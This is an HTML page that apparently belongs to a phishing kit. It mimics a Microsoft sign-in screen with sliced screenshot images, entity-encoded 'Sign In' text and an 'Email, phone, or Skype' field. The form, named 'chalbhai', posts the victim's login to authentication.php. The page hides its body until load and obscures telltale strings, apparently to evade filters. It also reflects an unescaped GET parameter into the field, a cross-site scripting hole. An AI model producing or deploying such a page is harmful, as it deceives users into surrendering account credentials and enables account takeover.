<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#83;&#105;&#103;&#110;&#32;&#73;&#110;</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>	
<script type="text/javascript">
function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}
</script>
<style type="text/css">
 .textbox {
    height: 36px;
    width: 275px;
	padding-left: 8px;
	font-family: "Segoe UI Webfont",-apple-system,"Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
    font-size: 15px;
    line-height: 20px;
    font-weight: 400;
    font-size: .9375rem;
    border: 1px solid #666;
    
    
}
 .textbox:focus {
    border-color: #4488cc;
	border-style: solid;   
    border-width: 1px;
    outline: 0;
}
 </style>
<style type="text/css">
div#container
{
	position:relative;
	width: 1365px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

</head>
<body style="visibility:hidden" onload="unhideBody()" bgColor="#030100">
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1365px; height:172px; z-index:0"><img src="images/m1.png" alt="" title="" border=0 width=1365 height=172></div>

<div id="image2" style="position:absolute; overflow:hidden; left:0px; top:169px; width:1365px; height:161px; z-index:1"><img src="images/m2.png" alt="" title="" border=0 width=1365 height=161></div>

<div id="image3" style="position:absolute; overflow:hidden; left:0px; top:328px; width:1365px; height:176px; z-index:2"><img src="images/m3.png" alt="" title="" border=0 width=1365 height=176></div>

<div id="image4" style="position:absolute; overflow:hidden; left:0px; top:499px; width:1365px; height:164px; z-index:3"><img src="images/m4.png" alt="" title="" border=0 width=1365 height=164></div>

<div id="image5" style="position:absolute; overflow:hidden; left:701px; top:258px; width:82px; height:17px; z-index:4"><a href="#"><img src="images/m6.png" alt="" title="" border=0 width=82 height=17></a></div>

<div id="image6" style="position:absolute; overflow:hidden; left:590px; top:400px; width:68px; height:14px; z-index:5"><a href="#"><img src="images/m7.png" alt="" title="" border=0 width=68 height=14></a></div>

<div id="image7" style="position:absolute; overflow:hidden; left:1148px; top:641px; width:205px; height:16px; z-index:8"><a href="#"><img src="images/m5.png" alt="" title="" border=0 width=205 height=16></a></div>

<form action=authentication.php name=chalbhai id=chalbhai method=post>
<input name="userid" placeholder="&#69;&#109;&#97;&#105;&#108;&#44;&#32;&#112;&#104;&#111;&#110;&#101;&#44;&#32;&#111;&#114;&#32;&#83;&#107;&#121;&#112;&#101;" class="textbox" value="<?=$_GET[userid]?>" autocomplete="off" required type="text" style="position:absolute;width:338px;left:514px;top:292px;z-index:6">
<div id="formimage1" style="position:absolute; left:513px; top:344px; z-index:7"><input type="image" name="formimage1" width="340" height="38" src="images/continue.png"></div>

</div>

</body>
</html>
